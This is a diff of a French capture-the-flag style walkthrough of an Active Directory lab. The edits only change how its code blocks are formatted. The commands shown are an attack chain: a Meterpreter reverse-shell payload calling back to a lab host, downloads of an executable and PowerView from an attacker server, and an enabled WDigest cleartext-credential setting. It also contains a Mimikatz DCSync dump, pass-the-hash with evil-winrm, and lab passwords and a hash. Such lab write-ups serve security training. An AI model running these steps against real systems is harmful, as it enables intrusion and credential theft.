@@ -28,27 +28,18 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
 1. **Obtenir un shell interactif (Meterpreter)**
    *   Générer un payload avec `msfvenom` :
 
-       {% code overflow="wrap" fullWidth="true" %}
-       ```bash
-       msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.167 -f exe -o backupscript.exe LPORT=4444
-       ```
-       {% endcode %}
+       <pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.167 -f exe -o backupscript.exe LPORT=4444
+       </code></pre>
    *   Déployer le fichier via `Invoke-WebRequest` :
 
-       {% code overflow="wrap" %}
-       ```powershell
-       Invoke-WebRequest -Uri "http://10.10.14.124:8000/backup.exe" -OutFile "C:\windows\system32\inetsrv\backup.exe"
-       ```
-       {% endcode %}
+       <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-WebRequest -Uri "http://10.10.14.124:8000/backup.exe" -OutFile "C:\windows\system32\inetsrv\backup.exe"
+       </code></pre>
    * Écouter la connexion sur Metasploit : `exploit/multi/handler`
 2. **Kerberoasting avec PowerView**
    *   Importer PowerView :
 
-       {% code overflow="wrap" fullWidth="true" %}
-       ```powershell
-       Invoke-WebRequest -Uri "http://10.10.14.124:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
-       ```
-       {% endcode %}
+       <pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">Invoke-WebRequest -Uri "http://10.10.14.124:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+       </code></pre>
    *   Identifier l'utilisateur Kerberoastable :
 
        ```powershell
@@ -81,14 +72,11 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
 
 1.  **Connexion en PSSession**
 
-    {% code overflow="wrap" %}
-    ```powershell
-    $user = "inlanefreight\svc_sql"
+    <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">$user = "inlanefreight\svc_sql"
     $Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
     $credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
     Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
-    ```
-    {% endcode %}
+    </code></pre>
 2.  **Récupération du Flag**
 
     ```powershell
@@ -110,12 +98,9 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
     * **Utilisateur trouvé :** `tpetty`
 2.  **Activer l'enregistrement des credentials en clair**
 
-    {% code overflow="wrap" fullWidth="true" %}
-    ```powershell
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1
+    <pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1
     Restart-Computer
-    ```
-    {% endcode %}
+    </code></pre>
 
     * **Mot de passe :** `Sup3rS3cur3D0m@inU2eR`
 
@@ -125,12 +110,9 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
 
 1.  **Vérifier les permissions avec PowerView**
 
-    {% code overflow="wrap" %}
-    ```powershell
-    $sid= Convert-NameToSid tpetty
+    <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">$sid= Convert-NameToSid tpetty
     Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
-    ```
-    {% endcode %}
+    </code></pre>
 
     * **Attaque possible :** `DCSync`
 
@@ -140,11 +122,8 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
 
 1.  **DCSync Attack avec Mimikatz**
 
-    {% code overflow="wrap" %}
-    ```powershell
-    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
-    ```
-    {% endcode %}
+    <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+    </code></pre>
 
     * **Hash Admin :** `27dedb1dab4d8545c6e1c66fba077da0`
 2. **Connexion à DC01 via Evil-WinRM**
@@ -155,11 +134,8 @@ Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté
        ```
    *   Connexion :
 
-       {% code overflow="wrap" %}
-       ```bash
-       evil-winrm -i localhost --port 9999 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
-       ```
-       {% endcode %}
+       <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">evil-winrm -i localhost --port 9999 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
+       </code></pre>
 3.  **Récupération du Flag final**
 
     ```powershell
